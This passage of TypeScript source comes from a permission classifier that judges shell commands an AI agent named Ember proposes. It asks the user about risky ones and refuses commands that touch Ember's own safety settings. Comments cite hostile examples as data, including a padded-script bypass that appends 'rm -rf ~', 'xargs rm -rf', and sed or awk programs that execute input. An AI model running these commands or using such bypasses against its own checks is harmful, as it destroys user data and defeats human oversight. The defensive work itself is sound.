/**
 * The command classifier (design §3.4-§3.6, OWNER DECISION 4): what a command would do, read from the command line Ember
 * can see. Tokenize per shell family, resolve words, unwrap wrappers and payloads, find each program's verb past its
 * global options, look up its row, apply the redirection, pipeline and path rules, then Ember's own refusals (D4.5).
 * The result lists every dangerous finding (class a-g), the paths the target must report on, and what the command runs
 * and downloads. Pure, synchronous and total: an internal error is one "unclear" finding, never a throw, never an
 * ordinary verdict. Plain Node (the remote agent bundles it); paths by the TARGET's rules only (critique
 * integration-11). Conservative throughout: anything not fully understood is "unclear" and asks (D4.3 g).
 */

import type {
  Classification, ClassifyContext, CommandObject, DangerClass, Finding, ParsedCommand, ShellFamily, ShellId, WindowsContext,
} from "./types";
import { PKG_CLEANS, PKG_PRUNES, PKG_REMOVES, SHELL_FAMILY } from "./types";
import { braceGroup, lexPosix, MAX_SIMPLE, type PList, type PSimple, type PWord, type PRedir, type Unclear } from "./lex-posix";
import { lexPowerShell, restrictedExpression, type PsArg, type PsCommand, type PsRedir, type PsSeg, type PsStatement } from "./lex-powershell";
import { lexCmd, type CSimple, type CWord } from "./lex-cmd";
import {
  type Arg, type OptSpec, type Parsed, CPU_COUNT_WORD, countWord, has, isOption, joinList, lit, nonAsciiLetters, optIs, parseOpts, programName, shownPath, values,
} from "./words";
import {
  type PathEnv, type PathUse, WRITES, baseName, flavourOf, globPrefix, globReaches, globRegExp, globWriteKind, holdsEmberPath,
  holdsSecret, inDownload, inWorkTree, isAbsolute, isEmberPath, isUnder, homeDotFile, opaqueWindowsPath, pathEnv, physicalForm,
  resolveTargetPath, secretCandidates, secretKind, SECRET_SAMPLE_NAMES, SHORT_NAME, toMount, UNNAMED_COPY, UNNAMED_DOWNLOAD, unnamedFolder,
  windowsContextOf, writeKind, wslUncPath,
} from "./paths";
import {
  CLIPBOARD_READERS, CLOUD_CLIS, CLOUD_DELETE, CLOUD_READ, CLOUD_READ_PHRASES, DECODERS, DISK_TOOLS, FETCHERS, GIT_CODE_KEYS, GLOBAL_OPTIONS,
  DOWNLOAD_READERS, READER_RUNS, GUI_PROGRAMS, INPUT_SYNTH, INTERACTIVE, INTERPRETERS, LANGUAGE_INSTALL_VERBS, LAUNCHERS, NAME_DESTROY, NAME_PUBLISH, NAME_SYSTEM,
  ORDINARY_PROGRAMS, ORDINARY_VERBS, OTHER_SHELLS, POSIX_SHELLS, PS_ALIASES, PS_CMDLETS, PS_COMMON, PS_COMMON_ALIASES, RISKY_ASSIGNMENTS, RISKY_ASSIGNMENT_PREFIX,
  RECORDERS, SCREENSHOTTERS, SECRET_PROGRAMS, SECRET_VAR, SUDO_LIKE, SYSTEM_PACKAGERS, WRAPPERS, type GlobalGrammar, type OrdinaryVerbs, type PsCmdletSpec,
  type PsParamKind,
} from "./tables";
import { commandLineSecret } from "./redact";
import { judgedText } from "./unroll";
import posix from "node:path/posix";
import win32 from "node:path/win32";

/** The target's OS (the contract's own type, so this file imports nothing outside the commands package). */
type OS = ClassifyContext["os"];

/** A `..` segment in a POSIX path. */
const DOT_DOT = /(^|\/)\.\.(\/|$)/;
/** How a script is read that the kernel or a POSIX shell opens by the name as written (`..` walked through links). */
const POSIX_OPENERS: ReadonlySet<string> = new Set(["sh", "bash", "zsh", "shebang"]);
/** The card's words for a script whose path has a `..` the target couldn't resolve (L25). */
export const SCRIPT_UNSURE = "Ember can't tell which script this runs.";

/** Text longer than this is unclear (§3.4.1). */
export const MAX_COMMAND_CHARS = 8000;
/** At most this many paths are probed (§3.6); more → unclear. */
export const MAX_PROBE = 64;
/** At most this many scripts are read and classified per command (L8, the lead's ruling); more asks. */
export const MAX_SCRIPTS = 16;
/**
 * A part of a variable's value Ember can't see (Classifier.varValues), the mark of a value that is a pattern (a loop's
 * `*.log`: only those expand; an assigned or quoted value never does), and how many values Ember keeps per word.
 */
const UNSEEN = "\u0000";
const PATTERN = "\u0001";
const MAX_FORMS = 32;
/** One piece of a POSIX word Ember couldn't resolve (Arg.parts). */
type Part = NonNullable<Arg["parts"]>[number];
/**
 * Programs that only test, print or name a variable's value, reading no file it names (commands-remote-r4-5): a word
 * that uses a variable there leaves the variable's value unjudged.
 */
const VAR_SHOWN_ONLY: ReadonlySet<string> = new Set(["echo", "printf", "test", "[", "[[", ":", "true", "false", "basename", "dirname", "export", "declare", "typeset", "local", "readonly", "unset", "set", "shift", "return", "exit", "read"]);
/**
 * Of those, the ones that print it: what they print only shows it on the terminal; into a file, a substitution or a
 * later command it reaches whatever reads it (commands-remote-c5-1).
 */
const VAR_PRINTERS: ReadonlySet<string> = new Set(["echo", "printf", "basename", "dirname", "export", "declare", "typeset", "local", "readonly", "set"]);
/**
 * Programs that only read their input as text (`grep -q x <<< "$d"`, `wc -c <<< "$d"`): a variable in it is no use of
 * its value as a path while nothing takes what they print (commands-remote-w5-4). An allow-list, so any other program
 * counts; sed and awk only without a program file or arguments Ember can't see, which may run what they read.
 */
const TEXT_READERS: ReadonlySet<string> = new Set([
  "grep", "egrep", "fgrep", "wc", "tr", "sed", "awk", "gawk", "mawk", "nawk", "cat", "tac", "sort", "uniq", "head", "tail", "cut", "nl", "rev", "fold",
  "paste", "column", "od", "xxd", "hexdump", "base64", "md5sum", "sha1sum", "sha256sum", "sha512sum", "cksum", "jq",
]);
const readsText = (key: string, args: readonly Arg[]): boolean => TEXT_READERS.has(key)
  && !(key === "sed" && args.some(a => a.v === null || /^(-[A-Za-z]*f|--file)/.test(a.v)))
  && !(/awk$/.test(key) && args.some(a => a.v === null || /^(-[A-Za-z]*[fEil]|--(file|exec|include|load))/.test(a.v)))
  // A program that runs what it reads or writes files (`awk '{system($0)}'`, `sed 's/^/rm /e'`) isn't only reading it
  // (commands-remote-r5-4).
  && !(key === "sed" && !filterPrograms(key, args).every(t => t !== null && sedScriptOk(t)))
  && !(/awk$/.test(key) && !filterPrograms(key, args).every(t => t !== null && awkProgramOk(t)));
/** The program text sed or awk runs: its -e (sed's --expression, gawk's --source) values, else its first operand. */
function filterPrograms(key: string, args: readonly Arg[]): (string | null)[] {
  const p = key === "sed"
    ? parseOpts(args, { shortValue: "efl", longValue: ["expression", "file", "line-length"], longOptional: ["in-place"] })
    : parseOpts(args, { shortValue: "fFvWeilE", longValue: ["file", "field-separator", "assign", "source", "include", "load", "exec"] });
  const given = values(p, "e", ...(key === "sed" ? ["expression"] : ["source"]));
  return given.length ? given : [p.operands[0]?.v ?? null];
}
/** The shell's positional parameters (`$1`…`$9`, `$@`, `$*`), as `set --` gives them values. */
const POSITIONAL: readonly string[] = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "@", "*"];
/** What `read` may set from a text: each of its lines, and each word of each line. */
function textValues(text: string): Arg[] {
  const out = new Set<string>();
  for (const line of text.split("\n")) {
    const l = line.trim();
    if (l === "") continue;
    out.add(l);
    for (const word of l.split(/\s+/)) out.add(word);
  }
  return [...out].map(t => lit(t));
}

/**
 * What classifyCommand returns beyond the contract (an extension in CL's own files; decide.ts reads it, everyone else
 * may ignore it): the folder the command was judged in, and whether it reaches the Windows side of a WSL target.
 */
export interface ClassificationExtra extends Classification {
  /** The task's folder the command runs in (absolute on the target). */
  cwd: string;
  /** A WSL command touching the drive mounts, a Windows-form path or a Windows program (§3.8.2's Windows line). */
  windowsReach: boolean;
  /**
   * Shell scripts this command runs by path (`sh x.sh`, `./x.sh`, `source x.sh`, `powershell -File x.ps1`, `cmd
   * x.bat`): the flow reads each one and classifies its text as a nested command (L8, the lead's ruling), so a
   * dangerous script asks and a refusal refuses. Interpreter scripts (node, python…) are not here: they run like a
   * build (L8 unchanged).
   */
  scripts: ScriptRef[];
  /**
   * Files and folders this command writes, moves, deletes or unpacks into (a folder covers everything under it): the
   * task remembers them, so a script an earlier command wrote that can't be read in full asks (L8's padding bypass:
   * `printf '%70000s' > t.sh; echo 'rm -rf ~' >> t.sh`, then `sh t.sh`). Absolute on the target.
   */
  writes: string[];
  /**
   * It may write files where Ember can't tell: a checkout's work tree, an archive unpacked with options Ember can't
   * follow, or code Ember can't see or follow (an unclear or escape finding: it runs only once the user said yes).
   */
  writesAnywhere: boolean;
  /** Of those, the writes Ember can't place that no finding stands for (a checkout's work tree, an archive unpacked). */
  writesUnplaced?: boolean;
  /**
   * The line sets a variable (but a `for` list's or a read's own, judged apart), changes the folder, its options or
   * positional words, or sources or execs (shellStateChanged): its commands are judged in the folder and with the values
   * the line starts with, so withoutReadFlow keeps an if's own words, as main did (commands-b7-1, b7-3). A loop's words it
   * keeps whatever this says (commands-c7-1).
   */
  holdsFlow?: boolean;
  /**
   * The line was judged as its written-out form (unroll.ts: a simple `[[ … ]]` as `[ … ]`): it runs, asks or is
   * refused as that form is, but never runs with a Stop because the user's words asked for what it does
   * (commands-b7-2 stands; decide.ts).
   */
  writtenOut?: boolean;
  /**
   * Downloads that are the download only while the target doesn't say they are a folder: a download moved or copied
   * to a name that may be one (`mv x.py tools`), whose file is then tools/x.py, also in `downloads`. Until the target
   * says so (withRealPaths) the name counts too, so a path that skips the check stays on the safe side.
   */
  downloadsIfFile?: string[];
}

/** A shell script to read and classify (ClassificationExtra.scripts). */
export interface ScriptRef {
  /** Its path, resolved on the target (absolute). */
  path: string;
  /**
   * How to read its text: a POSIX shell, PowerShell, cmd, or "shebang" (run directly: the `#!` line names the
   * interpreter, and a text file without one is run by the calling shell).
   */
  as: "sh" | "bash" | "zsh" | "powershell" | "cmd" | "shebang";
  /** The folder it runs in (its relative paths resolve there, not beside the script); "" when unknown. */
  cwd: string;
  /**
   * The path as the shell hands it to the kernel, `..` kept (physicalForm), when it holds a `..` the kernel walks
   * through links (`sh sub/../t.sh`, `cd link && sh ../t.sh`): the script is read by this name, which opens the file
   * that runs, not the lexical `path`. Absent: `path` is read.
   */
  open?: string;
  /**
   * Where the script really is, as the target reported it: `open`'s real path, or a link's target. What the task's
   * writes and downloads are compared with, beside `path`. Absent: not known (no `..`, no link, or not asked yet).
   */
  real?: string;
  /**
   * The script is in the task's own folder (ownFolder, its real path too when known): an unknown program inside it is
   * the project's tooling and is judged as before the closed default, as the script itself is (commands-closed-x9-4).
   */
  project?: true;
}

/** The administrator's policy key (HKLM\SOFTWARE\Policies\Ember, in any spelling of the hive), refused (D4.5). */
const POLICY_KEY = /(^|\\)policies\\ember(\\|$)/i;
/** A registry key above the policy key (HKLM, HKLM\SOFTWARE, …\Policies, in any spelling): deleting or moving it removes the policy. */
function policyAncestor(key: string): boolean {
  const k = key.replace(/^registry::/i, "").replace(/^hkey_local_machine/i, "hklm").replace(/^hkey_current_user/i, "hkcu").replace(/:/, "").replace(/[\\/]+$/, "").toLowerCase();
  return /^(hklm|hkcu)(\\software(\\policies)?)?$/.test(k);
}

/** A Windows path's drive ("C:"), when it has one. */
const drive = (p: string | null | undefined): string | undefined => (p ? /^[A-Za-z]:/.exec(p)?.[0] : undefined);

/** SendKeys as code (`[System.Windows.Forms.SendKeys]::SendWait(…)`, `$shell.SendKeys(…)`), not the word in a message. */
const SENDKEYS = /sendkeys\s*\]|\.sendkeys\b/i;

/** The card's words for the escape class (§3.8.4). */
export const SAYS = {
  keepsRunning: "Keeps running after Ember stops; Stop can't end it.",
  downloadsAndRuns: "Downloads code and runs it.",
  opensProgram: "Opens a program that keeps running after Ember stops.",
  runsDownloaded: "Runs a file downloaded in this task.",
  mayRunDownloaded: "May run a file downloaded in this task: Ember can't tell which files an earlier command downloaded or changed.",
  downloadsUnnamed: "Downloads to a file Ember can't name.",
  guardedWord: "It uses a ${…:?} word, which Ember reads as the folder it names but can't be sure of.",
  optionValue: "Ember can't tell whether one of its options takes the word after it.",
  namedKeyword: "It runs a program named like one of the shell's own words.",
  scriptStream: "It runs a script from a stream, which Ember can't read first.",
  downloadsProgram: "Downloads a program and runs it.",
  unknownProgram: "It runs a program Ember doesn't know.",
  unclear: "Ember can't tell exactly what this does.",
  interactive: "This opens an interactive program; you'd have to use it yourself in the command window.",
  openApp: "This opens an app window, which Ember can do itself without a command. Say no and ask Ember to open it.",
  cmdLinuxFolder: "cmd can't use a Linux folder: this would run in C:\\Windows.",
  root: "Runs as an administrator (root).",
  secrets: "Reads or changes passwords, keys or sign-ins.",
  history: "Reads your shell history, which may hold passwords.",
  env: "Prints environment variables that may hold tokens.",
  clipboard: "Reads your clipboard, which may hold a password.",
  screen: "Takes a picture of your screen without Ember's privacy filters.",
  tokenArg: "Puts a password or token on the command line.",
  records: "Records from the microphone or the camera.",
  refuseSafety: "Ember won't run this: it would change Ember's own safety settings, records or programs.",
  refuseRead: "Ember won't run this: it would read Ember's own safety settings, records or programs.",
  refuseInput: "Ember won't run this: it could press keys or click in Ember's own windows.",
  refuseTerminal: "Ember won't run this: it would type or run commands in your own terminal or editor.",
  terminalText: "Reads what your own terminal shows, which may hold passwords.",
  // The same refusals when only an earlier reading of one of the command's options makes them (Classifier.heldRefusal).
  heldRefuseSafety: "Ember won't run this: it can't tell whether one of its options takes the word after it, so it may change Ember's own safety settings, records or programs.",
  heldRefuseRead: "Ember won't run this: it can't tell whether one of its options takes the word after it, so it may read Ember's own safety settings, records or programs.",
  heldRefuseInput: "Ember won't run this: it can't tell whether one of its options takes the word after it, so it may press keys or click in Ember's own windows.",
  heldRefuseTerminal: "Ember won't run this: it can't tell whether one of its options takes the word after it, so it may type or run commands in your own terminal or editor.",
} as const;

/** Where a part of the command is judged. */
interface Scope {
  family: ShellFamily;
  shell: ShellId;
  /** Whose rules: lookup case, path flavour. */
  os: OS;
  path: PathEnv;
  /** The folder relative paths resolve against now (a `cd` inside the command moves it; null: unknown). */
  cwd: string | null;
  home: string | null;
  wrappers: string[];
  depth: number;
  /** Inside a WSL distro (interop rules, the Windows line). */
  wsl: boolean;
  mountRoot: string | null;
  windows: WindowsContext | null;
  /** A cmd or PowerShell scope reached from a WSL distro. */
  fromWsl: boolean;
  /**
   * Its paths are another system's (a distro's, reached from a Windows target; Windows', reached from a distro): the
   * target can't check them, so none is probed and an overwrite of one always asks.
   */
  foreign?: boolean;
}

/** A redirection, family-neutral. */
interface Redir { op: ParsedCommand["redirects"][number]["op"]; target: Arg | null; kind: "write" | "append" | "read" | "none" }

/** Everything about one simple command, family-neutral. */
interface Simple {
  words: Arg[];
  redirs: Redir[];
  /** Where stdin comes from. */
  stdin: "pipe" | "heredoc" | "file" | null;
  /**
   * A here-document's or here-string's text, when it is stdin and Ember can read all of it (quoted, or without
   * expansions); null when it can't. A program that reads its own program text from stdin is judged by it (review #166).
   */
  stdinText?: string | null;
  /**
   * A here-string or unquoted here-document on stdin whose text uses variables (`<<< "$d"`): their names, and a
   * here-string's word, so Ember's own refusal follows a variable into the program's input (commands-remote-v5-2).
   */
  stdinVars?: HereVars;
  /**
   * A POSIX command's own input as a `read` would read it (commands-a7-2): no redirection and no pipe ("none": its
   * loop's or `if`'s, or the user's typing), only here-strings or here-documents on stdin whose text Ember sees whole
   * ("seen"), or anything else ("other": a pipe, a file, another descriptor, `<&3`, text Ember can't see).
   */
  ownInput?: "none" | "seen" | "other";
  /** An earlier command in its pipeline fetches from the network or decodes hidden text. */
  fetchBefore: boolean;
  background: boolean;
  pipedFrom?: number;
  /** What it prints goes on to a later command of its pipeline or into a substitution (commands-remote-w5-4). */
  pipedOn?: boolean;
  /** What it prints is the next simple command's input, which judges what echo or printf printed (printedBy). */
  carriedOn?: boolean;
  /** Its words or here-string hold text a substitution fetched, as written or through a variable (commands-remote-c7-3). */
  fetched?: boolean;
  /** PowerShell: the parsed command (for cmdlet parameters). */
  ps?: PsCommand;
}

/** The variables a here-string or here-document's text uses, and a here-string's word (null for a here-document). */
interface HereVars { names: string[]; word: Arg | null }

/**
 * What echo or printf prints into the next command of its pipeline, as that command's input (commands-remote-c5-1):
 * the text when Ember sees all of it, else null with the variables its words use (and the word, when it prints one).
 */
interface Printed { text: string | null; vars?: HereVars }

/** The variables a word uses (Arg.parts), by name. */
const varNames = (a: Arg): string[] => (a.parts ?? []).flatMap(p => (typeof p !== "string" && p.name !== null ? [p.name] : []));

/**
 * What the shell's own echo or printf prints (Printed), or null for any other program. echo prints its words with spaces;
 * printf each argument through a format of one %s and separators, or a plain format with no arguments (`printf
 * 'FLUSHALL\n'`). Anything else, a pattern or a backslash in a word (echo's escapes differ between shells) is text
 * Ember doesn't see.
 */
function printedBy(words: readonly Arg[]): Printed | null {
  let k = 0;
  while (k < words.length - 1 && words[k].v !== null && ASSIGNS_AFTER.has(words[k].v ?? "")) k++;
  // Only the shell's own, by its bare name: `./echo` or `/tmp/printf` is a program that prints what it likes
  // (commands-remote-c7-2).
  const prog = words[k]?.v ?? "";
  if (prog !== "echo" && prog !== "printf") return null;
  let rest = words.slice(k + 1);
  let shown: Arg[];
  let render: ((values: string[]) => string) | null;
  if (prog === "echo") {
    while (rest.length && rest[0].v !== null && /^-[neE]+$/.test(rest[0].v)) rest = rest.slice(1);
    shown = rest;
    render = vs => `${vs.join(" ")}\n`;
  } else {
    if (rest[0]?.v === "--") rest = rest.slice(1);
    // `printf -v d …` prints nothing: it sets d (setVar).
    if (rest.length === 0 || rest[0].v === "-v") return null;
    const format = rest[0].v;
    // Only `\n`, `\t` and a lone `\0`: any other escape printf reads (`\056`, `\0056`, `\x2e`, `\u002e`, `\e`, `\\`) is
    // text Ember doesn't see, never its backslash text (commands-remote-x6-2).
    const unescape = (s: string): string => s.replace(/\\([nt0])/g, (_m, c: string) => (c === "n" ? "\n" : c === "t" ? "\t" : "\0"));
    if (format !== null && /^([^%\\]|\\([nt]|0(?![0-7])))*$/.test(format) && rest.length === 1) {
      // Printed text with a NUL in it is no name Ember can judge or show in a card's line: text it doesn't see.
      const text = unescape(format);
      return { text: text.includes("\0") ? null : text };
    }
    const each = format !== null && /^(%s|\\([nt]|0(?![0-7]))|[ \t])+$/.test(format) && (format.match(/%s/g) ?? []).length === 1 && rest.length > 1;
    shown = each ? rest.slice(1) : rest;
    render = each && format !== null ? vs => vs.map(v => unescape(format).replace("%s", () => v)).join("") : null;
  }
  const names = [...new Set(shown.flatMap(varNames))];
  const text = render && shown.every(a => a.v !== null && !a.glob && !a.v.includes("\\")) ? render(shown.map(a => a.v ?? "")) : null;
  if (text !== null && !text.includes("\0")) return { text };
  return names.length ? { text: null, vars: { names, word: render && shown.length === 1 ? shown[0] : null } } : { text: null };
}

/** An object as the classifier tracks it. */
interface Obj extends CommandObject {
  /** The absolute path judged (null: unresolved). */
  abs: string | null;
  /** The target reported a different real path (second pass). */
  realDiffers?: boolean;
  /** Its form with `..` kept (physicalForm), probed for the file the kernel opens: what "if it exists" asks about. */
  phys?: string;
}

/** How a path use reaches Ember's own files, for the refusal's verb (§3.5.8): reading them, or changing or running them. */
const READ_USES: ReadonlySet<PathUse> = new Set<PathUse>(["read", "readTree", "list", "cd"]);
const accessOf = (use: PathUse): "read" | "safety" => (READ_USES.has(use) ? "read" : "safety");

/**
 * A pipeline's running state: did an earlier element fetch or decode, and what did the last one run; `carried`: an
 * earlier element read a file this task downloaded (`cat x.py | tee y.py` writes the download out again).
 */
interface PipeState { fetch: boolean; program: string; carried?: boolean }

/** The POSIX shells' reserved words among the names the keyword row is registered for: a word is one only written bare. */
const RESERVED_WORDS: ReadonlySet<string> = new Set(["if", "then", "elif", "else", "fi", "for", "while", "until", "do", "done", "case", "esac", "select", "function", "coproc", "in", "[[", "]]", "{", "}"]);

/**
 * The findings of sh's and bash's flow words alone (`if`, `then`, `do`…): a command line or script reads through them
 * (scripts.ts's SCRIPT_FLOW), so one of them never stands for a command's own finding.
 */
const READ_FLOW_RULE = /^unclear\.(if|then|elif|else|fi|for|while|until|do|done|in)$/;

/**
 * Words marked while a command is judged: judged as a path where they were used, or handed to the command a wrapper
 * runs. A row judged a second way (Engine.runRow) marks in a layer of its own, which goes with that reading: a word
 * main's table read as a file or as a command is not passed over for it when the row's own reading's uses of a
 * variable are noted, so the variable's values are still judged (commands-held-x9-1).
 */
class WordMarks {
  private layers: WeakSet<Arg>[] = [new WeakSet()];
  add(a: Arg): void { this.layers[this.layers.length - 1].add(a); }
  has(a: Arg): boolean { return this.layers.some(l => l.has(a)); }
  /** Starts a layer for a reading judged apart; the function returned takes it back, with every mark made in it. */
  apart(): () => void {
    const layer = new WeakSet<Arg>();
    this.layers.push(layer);
    return () => { const k = this.layers.lastIndexOf(layer); if (k > 0) this.layers.length = k; };
  }
}

/** The classifier's state for one command text. */
class Classifier {
  findings: Finding[] = [];
  commands: ParsedCommand[] = [];
  probe: string[] = [];
  refuse: { rule: string; says: string } | null = null;
  /** Whether the refusal is only for reading Ember's own files (a later change or input refusal says more). */
  private refusedRead = false;
  downloads: string[] = [];
  /** Of `downloads`, those to drop when the target says they are a folder (ClassificationExtra.downloadsIfFile). */
  downloadsIfFile: string[] = [];
  needsGit = false;
  programs: string[] = [];
  windowsReach = false;
  scripts: ScriptRef[] = [];
  /** Paths this command writes, moves or deletes (a script among them can't be read before it runs). */
  written: { p: string; env: PathEnv }[] = [];
  /** A part of the command writes files Ember can't name (an archive extracted, a patch applied, a checkout). */
  writesUnnamed = false;
  /** The folders those unnamed files go into (unnamedWriteFolders), or anywhere when Ember can't tell. */
  unnamedAt: string[] = [];
  unnamedAnywhere = false;
  /** Scripts recorded only because a name may resolve to them (`.\x` → x.ps1), with what had been written by then. */
  private candidates = new Map<ScriptRef, { written: number; unnamed: boolean }>();
  /** Scripts recorded though this same line marks them as a download (recordScript): the download's question is theirs. */
  private savedHere = new Set<ScriptRef>();
  simpleCount = 0;
  /** The command being classified (index into commands), -1 before the first. */
  at = -1;
  /** The program the current findings are about. */
  program = "";
  /** The current pipeline's state. */
  pipe: PipeState = { fetch: false, program: "" };
  /** What a listing (Get-ChildItem, Get-Item) hands down its pipeline: the folders or files it names, by command. */
  listed = new Map<number, Arg[]>();
  private probeFull = false;
  /** Commands (by index) with options before their verb: no intent row covers them (§3.7: "broader than named"). */
  private globalOpts = new Set<number>();
  /** The text sets an environment or shell variable somewhere: it may point a later command elsewhere (GH_REPO=…). */
  envChanged = false;
  /** The commands (by index) given a file or text to read (`< list.txt`, a here-document or here-string). */
  stdinGiven = new Set<number>();
  /**
   * Variables a loop sets for each file it names (`for f in …`, by those names when they are a short list of plain
   * ones) or each line it reads (`read -r l`), for the card.
   */
  loopVars = new Map<string, "for" | "read" | readonly string[]>();
  /** git remotes this line adds with an address (`git remote add e <url>`), UNSEEN for a name Ember can't see. */
  addedRemotes = new Set<string>();
  /**
   * Every value the text may give a POSIX variable (a loop's list, an assignment), UNSEEN standing for a part Ember
   * can't see: only for Ember's own refusal, never to resolve a word for anything else (commands-remote-c3-2).
   */
  protected varValues = new Map<string, string[]>();
  /** Variables the text sets to words Ember can't see (mayHoldWords): a command's output, a read, a loop over such words. */
  private wordVars = new Set<string>();
  /**
   * The `read`, `mapfile` and `readarray` commands (by index) and what they read: text Ember sees whole on their own
   * input, their loop's or `if`'s input (judged at the end by its closer: judgeReadText), or text it can't see
   * (commands-a7-2).
   */
  protected readText = new Map<number, "seen" | "closer" | "unseen">();
  /** What a loop's or an `if`'s closer (`done`, `fi`) gives the commands in it on their input (Simple.ownInput), by index. */
  protected closerInput = new Map<number, Simple["ownInput"]>();
  /**
   * The text sets a variable other than a `for` list's or a read's (setVar's `loop`), or assigns one in an expansion
   * (`${x:=…}`), from text Ember sees or not: its ifs keep their own words (holdsFlow, commands-b7-3), as its loops always do.
   */
  protected setsVars = false;
  /**
   * A plain variable's values, judged at the end only if a command used the variable in a word Ember didn't judge as a
   * path (`python3 -c "…$d…"`): testing or printing it isn't such a use (commands-remote-r4-5).
   */
  private pendingSets: { name: string; forms: string[]; sc: Scope }[] = [];
  /** Words of a variable judged as a path where they were used (judgeUnseen). */
  private judgedWords = new WordMarks();
  /** Variables a command used in a word Ember didn't judge as a path, apart from testing or printing it. */
  private usedUnjudged = new Set<string>();
  /** Those handed to a program that may change what they name: on its input or in its environment (commands-remote-w5-5). */
  private changedUnjudged = new Set<string>();
  /**
   * Variables a command printed to where its own output goes, and whether a loop, `if`, group or subshell sends what is
   * printed inside it on to a file or a later command (`for …; do echo "$f"; done | xargs rm -rf`): then those count
   * as uses too (commands-remote-c5-1).
   */
  private printedVars = new Set<string>();
  compoundOnward = false;
  /** Words a wrapper hands to the command it runs (payload, unwrap): the rest of its words are its own. */
  protected payloadWords = new WordMarks();
  /** The program word of each payload: a program with one among its words is a wrapper (afterRun's own-words checks). */
  protected payloadHeads = new Set<Arg>();
  /** A program's own words: all of them, or for a wrapper those that aren't its command's. */
  protected ownWords(args: readonly Arg[]): { own: Arg[]; wraps: boolean } {
    const wraps = args.some(a => this.payloadHeads.has(a));
    return { own: wraps ? args.filter(a => !this.payloadWords.has(a)) : [...args], wraps };
  }
  /** A loop's or `if`'s closer given text that uses variables (`done <<< "$d"`), for the reads in it (feedReads). */
  protected hereVarsAt = new Map<number, HereVars>();
  /** POSIX variables set from a substitution that fetched (`x=$(curl …)`): written to a file, the file is a download (commands-remote-c7-3). */
  protected fetchedVars = new Set<string>();
  /** A command since this was last cleared fetched from the network or printed fetched text (a group's redirection). */
  protected gaveFetched = false;
  /** `set -a`: every variable set after it is exported to the programs that run (commands-remote-v5-2). */
  allExport = false;
  /** The same for a PowerShell variable (lower case, `env:` kept): only for Ember's own refusal (commands-remote-c3-2). */
  protected psVarValues = new Map<string, string[]>();
  /** Words of a variable Ember couldn't resolve, with how they were used: judged again once a loop's input gives it a value. */
  private unseenUses: { parts: readonly Part[]; use: PathUse; sc: Scope }[] = [];
  /** The text a command was given on stdin by a here-document or here-string (null: Ember can't see all of it), by index. */
  protected hereAt = new Map<number, string | null>();
  /** The names each `read` sets, by command index, with its scope: a loop's here-string gives them values (result). */
  private readSets = new Map<number, { names: string[]; sc: Scope }>();

  constructor(readonly ctx: ClassifyContext, readonly topShell: ShellId) {}

  // ----------------------------------------------------------------------------------------------------------------
  // Findings.

  add(cls: DangerClass, rule: string, said: string, o: { objects?: Obj[]; widening?: string[]; ifExists?: string; program?: string; inFolder?: { says: string; objects: Obj[]; ifExists: string } } = {}): void {
    const program = o.program ?? this.program;
    // When nothing on this line was found to be a download the task saved under a name Ember knows, it can't say the
    // file that runs is one: it may be (commands-remote-r6-4; whatever else the task saved by name, a `> /dev/null`
    // included: x7-4). It asks all the same.
    if (rule === "escape.run-downloaded" && said === SAYS.runsDownloaded && !this.namedHit) return this.add(cls, rule, SAYS.mayRunDownloaded, o);
    const wrappers = this.commands[this.at]?.wrappers ?? [];
    // A POSIX shell's home folder is said as ~, as the card's header says it (commands-remote-r2-3).
    const home = this.topShell === "bash" || this.topShell === "zsh" || this.topShell === "sh" ? this.ctx.home : null;
    const says = cardWords(said, o.objects ?? [], wrappers, this.ctx.cwd || null, this.ctx.os, home, this.loopVars);
    // "If it exists" is asked of the file the kernel opens: `> sub/../x` overwrites the x beside sub's target.
    const opened = (objs: readonly Obj[], p: string): string => objs.find(ob => ob.abs === p && ob.phys !== undefined)?.phys ?? p;
    const ifExists = o.ifExists === undefined ? undefined : opened(o.objects ?? [], o.ifExists);
    if (this.findings.some(f => f.rule === rule && f.says === says && f.at === this.at && f.ifExists === ifExists)) return;
    const shown = (objs: readonly Obj[]): CommandObject[] => objs.map(ob => {
      const out: CommandObject = { kind: ob.kind, text: ob.text };
      if (ob.resolved !== undefined) out.resolved = ob.resolved;
      return out;
    });
    const objects = shown(o.objects ?? []);
    const widening = [...(o.widening ?? [])];
    if (this.globalOpts.has(this.at) && !widening.includes("global-option")) widening.push("global-option");
    if ((o.objects ?? []).some(ob => ob.realDiffers) && !widening.includes("real-path")) widening.push("real-path");
    const f: Finding = { cls, rule, says, program, objects, widening, at: this.at };
    if (ifExists !== undefined) f.ifExists = ifExists;
    if (o.inFolder) f.inFolder = { says: cardWords(o.inFolder.says, o.inFolder.objects, wrappers, this.ctx.cwd || null, this.ctx.os, home, this.loopVars), objects: shown(o.inFolder.objects), ifExists: opened(o.inFolder.objects, o.inFolder.ifExists) };
    this.findings.push(f);
  }

  /** Takes back findings added since `from` that `drop` picks: a nested reading's, which the caller's own finding covers. */
  dropFindings(from: number, drop: (f: Finding) => boolean): void {
    this.findings = [...this.findings.slice(0, from), ...this.findings.slice(from).filter(f => !drop(f))];
  }

  unclear(rule: string, says: string = SAYS.unclear): void {
    this.add("unclear", rule, says);
  }

  /** The current command has options before its verb (`npm --registry … publish`, `p4 -p … submit`). */
  markGlobalOptions(): void {
    if (this.at >= 0) this.globalOpts.add(this.at);
  }

  /**
   * Ember's own flat refusal (D4.5), in words for what the command would do: change ("safety"), only read ("read") or
   * press keys in Ember's windows ("input"), or type or run commands in a terminal or an editor of the user's
   * ("terminal", commands-remote-r9-1). The first one stands, except that a refusal for reading gives way to one for
   * anything more.
   */
  refuseWith(rule: string, kind: "safety" | "read" | "input" | "terminal"): void {
    if (this.refuse && !(this.refusedRead && kind !== "read")) return;
    this.refuse = { rule, says: kind === "safety" ? SAYS.refuseSafety : kind === "read" ? SAYS.refuseRead : kind === "terminal" ? SAYS.refuseTerminal : SAYS.refuseInput };
    this.refusedRead = kind === "read";
  }

  /**
   * The refusal as it stands, and putting one back: for a row judged a second way whose own refusal, when it has one,
   * is the one to say (runRow: `ltrace -F <Ember's file> ls` reads the file, though main's table ran it).
   */
  refusal(): { refuse: Classifier["refuse"]; read: boolean } {
    return { refuse: this.refuse, read: this.refusedRead };
  }
  putRefusal(r: { refuse: Classifier["refuse"]; read: boolean }): void {
    this.refuse = r.refuse;
    this.refusedRead = r.read;
  }

  /**
   * Says the refusal that stands as one only a row's second reading made (runRow), in words that are true of it: by
   * the row's own reading the command does no such thing, so Ember says what it can't tell and what the command may
   * do. `pkill -n server` is refused because main's table gave -n the name and left none, which stops every process,
